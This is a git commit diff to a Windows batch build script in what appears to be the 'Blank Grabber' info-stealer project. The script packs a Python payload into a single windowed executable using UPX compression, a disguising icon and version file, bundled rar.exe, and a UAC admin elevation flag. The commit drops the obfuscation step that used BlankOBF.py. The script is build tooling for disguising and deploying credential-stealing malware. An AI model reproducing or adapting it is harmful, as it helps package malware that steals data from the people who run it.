b925174e074130b893c599485a643020d5b645f0
43a1723 <hai1723notgay@gmail.com>
2024-06-17 20:51:05 +0700

    Update buildmy.bat

--- build/buildmy.bat
+++ build/buildmy.bat
@@ -1,5 +1,4 @@
 @echo off
-python "D:\v\Blank-Grabberr\Blank Grabber\Components\BlankOBF.py" "D:/v/Blank-Grabberr/argcode.py" -o "D:/v/Blank-Grabberr/argcode-o.py"
 pip install -r "D:\v\Blank-Grabberr\Blank Grabber\Components\requirements.txt"
-pyinstaller --noconfirm --onefile --windowed --icon "D:/v/Blank-Grabberr/build/imageres_15.ico" --upx-dir "D:/v/Blank-Grabberr/UPX" --version-file "D:/v/Blank-Grabberr/Blank Grabber/Components/version.txt" --uac-admin --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rar.exe;." --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rarreg.key;."  "D:/v/Blank-Grabberr/argcode-o.py"
+pyinstaller --noconfirm --onefile --windowed --icon "D:/v/Blank-Grabberr/build/imageres_15.ico" --upx-dir "D:/v/Blank-Grabberr/UPX" --version-file "D:/v/Blank-Grabberr/Blank Grabber/Components/version.txt" --uac-admin --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rar.exe;." --add-data "D:/v/Blank-Grabberr/Blank Grabber/Components/rarreg.key;."  "D:/v/Blank-Grabberr/argcode.py"
 rmdir /S /Q D:\v\Blank-Grabberr\build\argcode-o
